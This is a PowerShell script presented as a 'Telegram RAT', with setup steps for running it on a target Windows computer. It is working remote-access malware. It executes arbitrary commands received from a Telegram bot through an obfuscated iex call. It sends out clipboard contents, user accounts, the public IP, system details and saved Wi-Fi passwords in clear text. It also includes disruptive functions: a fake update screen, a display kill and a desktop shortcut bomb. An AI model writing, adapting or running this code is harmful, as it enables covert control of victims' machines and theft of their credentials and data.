<#
============================================= Beigeworm's Telegram RAT ========================================================

SYNOPSIS
This script connects target computer with a telegram chat to send powershell commands.

SETUP INSTRUCTIONS
1. visit https://t.me/botfather and make a bot.
2. add bot api to script.
3. search for bot in top left box in telegram and start a chat then type /start.
4. add chat ID for the chat bot (use this below to find the chat id) 

---------------------------------------------------
$token='YOUR_TOKEN' #Replace this with your bot Token
$URL='https://api.telegram.org/bot{0}' -f $Token
$inMessage=Invoke-RestMethod -Method Get -Uri ($URL +'/getUpdates') -ErrorAction Stop
$inMessage.result.message | write-output
$inMessage.result.message | get-member
-----------------------------------------------------

5. Run Script on target System
6. Check telegram chat for 'waiting to connect' message.
7. this script has a feature to wait until you start the session from telegram.
8. type in the computer name from that message into telegram bot chat to connect to that computer.

#>

#------------------------------------------------ SCRIPT SETUP ---------------------------------------------------
$Token = 'YOUR_TELEGRAM_BOT_TOKEN_HERE'
$ChatID = "YOUR_BOT_CHAT_ID_HERE"
$PassPhrase = "$env:COMPUTERNAME"
$URL='https://api.telegram.org/bot{0}' -f $Token 
$AcceptedSession=""
$LastUnAuthenticatedMessage=""
$lastexecMessageID=""

#----------------------------------------------- ON CONNECT ------------------------------------------------------
sleep 1

$MessageToSend = New-Object psobject 
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$env:COMPUTERNAME Waiting to Connect.."
Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"


#----------------------------------------------- ACTION FUNCTIONS -------------------------------------------------

Function ServiceInfo {
$comm = Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}
$outputPath = "$env:temp\serv.txt"
$comm | Out-File -FilePath $outputPath

$Pathsys = "$env:temp\serv.txt"
$msgsys = Get-Content -Path $Pathsys -Raw

$URL='https://api.telegram.org/bot{0}' -f $Token
$MessageToSend = New-Object psobject 
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$msgsys"
Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"
}

Function Close{
$MessageToSend = New-Object psobject 
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$env:COMPUTERNAME Connection Closed."
Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"
exit
}

Function Options{
Start-Sleep 1
Write-Output "=============================================="
Write-Output "============= MONTOOLS EXTRAS ==============="
Write-Output "=============================================="
Write-Output "Commands list - "
Write-Output "=============================================="
Write-Output "FakeUpdate  : Start a Spoof update"
Write-Output "Win93       : Start windows93"
Write-Output "KillDisplay  : Kill Displays for a few seconds"
Write-Output "ShortcutBomb  : 100 Shortcuts on the desktop"
Write-Output "SysInfo     : Gather system Info and send. "
Write-Output "ServiceInfo     : Gather services and send. "
Write-Output "=============================================="
Write-Output "Options     : Show this Menu"
Write-Output "Close       : Close this connection"
Write-Output "=============================================="
}


Function KillDisplay {

(Add-Type '[DllImport("user32.dll")]public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
Write-Output "Done."
}

Function ShortcutBomb {

$n = 100
$i = 0

while($i -lt $n) 
{
$num = Get-Random
$Location = "C:\Windows\System32\rundll32.exe"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$Home\Desktop\USB Hardware" + $num + ".lnk")
$Shortcut.TargetPath = $Location
$Shortcut.Arguments ="shell32.dll,Control_RunDLL hotplug.dll"
$Shortcut.IconLocation = "hotplug.dll,0"
$Shortcut.Description ="Device Removal"
$Shortcut.WorkingDirectory ="C:\Windows\System32"
$Shortcut.Save()
Start-Sleep -Milliseconds 10
$i++
}
Write-Output "Done."
}

Function FakeUpdate {
        $firstart = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"
        If (Test-Path $firstart) {
        New-Item $firstart
        }
        Set-ItemProperty $firstart HideFirstRunExperience -Value 1
        cmd.exe /c start chrome.exe --new-window -kiosk "https://fakeupdate.net/win8"
    function Do-SendKeys {
    param (
        $SENDKEYS,
        $WINDOWTITLE
    )
    $wshell = New-Object -ComObject wscript.shell;
    IF ($WINDOWTITLE) {$wshell.AppActivate($WINDOWTITLE)}
    Sleep 1
    IF ($SENDKEYS) {$wshell.SendKeys($SENDKEYS)}
}
    Do-SendKeys -WINDOWTITLE chrome.exe -SENDKEYS '{f11}'
    Write-Output "Done."
}

Function Win93 {
         $firstart = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"
        If (Test-Path $firstart) {
        New-Item $firstart
        }
        Set-ItemProperty $firstart HideFirstRunExperience -Value 1
        cmd.exe /c start chrome.exe --new-window -kiosk "windows93.net"
           function Do-SendKeys {
    param (
        $SENDKEYS,
        $WINDOWTITLE
    )
    $wshell = New-Object -ComObject wscript.shell;
    IF ($WINDOWTITLE) {$wshell.AppActivate($WINDOWTITLE)}
    Sleep 1
    IF ($SENDKEYS) {$wshell.SendKeys($SENDKEYS)}
}
    Do-SendKeys -WINDOWTITLE chrome.exe -SENDKEYS '{f11}'
    Write-Output "Done."
}


Function SysInfo {


$userString = "Username: $($userInfo.Name)"
$userString += "`nFull Name: $($userInfo.FullName)`n"
$userString+="Public Ip Address = "
$userString+=((I`wr ifconfig.me/ip).Content.Trim() | Out-String)
$userString+="`n"
$userString+="All User Accounts: `n"
$userString+= Get-WmiObject -Class Win32_UserAccount
$systemInfo = Get-WmiObject -Class Win32_OperatingSystem
$biosInfo = Get-WmiObject -Class Win32_BIOS
$processorInfo = Get-WmiObject -Class Win32_Processor
$computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
$userInfo = Get-WmiObject -Class Win32_UserAccount
$systemString = "Operating System: $($systemInfo.Caption) $($systemInfo.OSArchitecture)"
$systemString += "`nBIOS Version: $($biosInfo.SMBIOSBIOSVersion)"
$systemString += "`nProcessor: $($processorInfo.Name)"
$systemString += "`nMemory: $($systemInfo.TotalVisibleMemorySize) MB"
$systemString += "`nComputer Name: $($computerSystemInfo.Name)"

$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}$pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim()
$wifistring+="SSID: $ssid`nPassword: $pass`n`n"}}}$a++;}
"------------------------   USER INFO   --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII
$userString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"---------------------   CLIPBOARD INFO  -------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
Get-Clipboard | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"------------------------  SYSTEM INFO  --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
$systemString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"------------------------  WIFI INFO    --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
$wifistring | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append

$wifistring = " "
$Pathsys = "$env:temp\systeminfo.txt"
$msgsys = Get-Content -Path $Pathsys -Raw

$URL='https://api.telegram.org/bot{0}' -f $Token
$MessageToSend = New-Object psobject 
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$msgsys"
Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"

Start-Sleep 1
Remove-Item -Path $Pathsys -force


}

Sleep 5

# --------------------------------------------- TELEGRAM FUCTIONS -------------------------------------------------
Function IsAuth{ 
param($CheckMessage)
    if (($messages.message.date -ne $LastUnAuthMsg) -and ($CheckMessage.message.text -like $PassPhrase) -and ($CheckMessage.message.from.is_bot -like $false)){
    $script:AcceptedSession="Authenticated"
    $MessageToSend = New-Object psobject 
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$env:COMPUTERNAME Session Started."
    Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"
    return $messages.message.chat.id
    }
    Else{
    return 0
}}

Function StrmFX{
param(
$Stream
)
$FixedResult=@()
$Stream | Out-File -FilePath (Join-Path $env:TMP -ChildPath "TGPSMessages.txt") -Force
$ReadAsArray= Get-Content -Path (Join-Path $env:TMP -ChildPath "TGPSMessages.txt") | where {$_.length -gt 0}
foreach ($line in $ReadAsArray){
    $ArrObj=New-Object psobject
    $ArrObj | Add-Member -MemberType NoteProperty -Name "Line" -Value ($line).tostring()
    $FixedResult +=$ArrObj
}
return $FixedResult
}

Function stgmsg{
param(
$Messagetext,
$ChatID
)
$FixedText=StrmFX -Stream $Messagetext
$MessageToSend = New-Object psobject 
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value $FixedText.line
$JsonData=($MessageToSend | ConvertTo-Json)
Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body $JsonData -ContentType "application/json"
}

Function rtgmsg{
try{
        $inMessage=Invoke-RestMethod -Method Get -Uri ($URL +'/getUpdates') -ErrorAction Stop
        return $inMessage.result[-1]
}
Catch{
    return "TGFail"
}}

Sleep 5

While ($true){sleep 2
$messages=rtgmsg
if ($LastUnAuthMsg -like $null){$LastUnAuthMsg=$messages.message.date}
if (!($AcceptedSession)){$CheckAuthentication=IsAuth -CheckMessage $messages}
Else{
if (($CheckAuthentication -ne 0) -and ($messages.message.text -notlike $PassPhrase) -and ($messages.message.date -ne $lastexecMessageID)){
    try{
         $Result=ie`x($messages.message.text) -ErrorAction Stop
         $Result
         stgmsg -Messagetext $Result -ChatID $messages.message.chat.id
         }
   catch {stgmsg -Messagetext ($_.exception.message) -ChatID $messages.message.chat.id}
   Finally{$lastexecMessageID=$messages.message.date
}}}}
